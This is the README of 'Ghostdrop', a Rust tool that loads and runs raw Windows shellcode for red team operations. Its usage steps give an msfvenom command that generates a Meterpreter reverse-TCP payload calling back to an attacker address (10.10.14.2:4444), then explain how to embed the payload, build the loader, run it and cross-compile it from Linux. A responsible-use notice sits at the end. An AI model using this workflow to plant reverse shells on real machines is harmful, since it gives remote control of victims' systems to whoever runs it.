# Ghostdrop

A Windows shellcode execution tool for red team operations.

## Features

- Loads and executes raw Windows shellcode
- Supports Meterpreter reverse shell payloads
- Test mode for safe execution verification
- Cross-compilation support from Linux to Windows

## Usage

1. Generate shellcode using msfvenom:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f rust
```

2. Copy the generated shellcode into `src/main.rs`, replacing the placeholder array.

3. Build the project:
```bash
cargo build --release
```

4. Run the program:
```bash
./target/release/ghostdrop.exe
```

### Test Mode

To run in test mode (skips shellcode execution):
```bash
./target/release/ghostdrop.exe --test
```

## Cross-compilation from Linux to Windows

1. Install the Windows target:
```bash
rustup target add x86_64-pc-windows-msvc
```

2. Build for Windows:
```bash
cargo build --release --target x86_64-pc-windows-msvc
```

The compiled binary will be in `target/x86_64-pc-windows-msvc/release/ghostdrop.exe`

## Security Notice

This tool is intended for red team operations and penetration testing only. Use responsibly and in accordance with applicable laws and regulations. 